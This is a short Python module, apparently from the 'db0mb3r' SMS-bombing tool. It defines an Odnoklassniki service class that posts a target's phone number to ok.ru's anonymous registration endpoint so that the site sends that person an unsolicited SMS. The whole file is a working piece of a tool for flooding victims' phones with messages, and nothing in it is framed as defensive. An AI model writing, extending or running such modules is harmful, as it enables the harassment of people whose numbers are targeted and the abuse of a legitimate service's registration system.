from db0mb3r.services.service import Service


class Odnoklassniki(Service):
    async def run(self):
        await self.post(
            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            data={"st.r.phone": "+" + self.formatted_phone},
        )
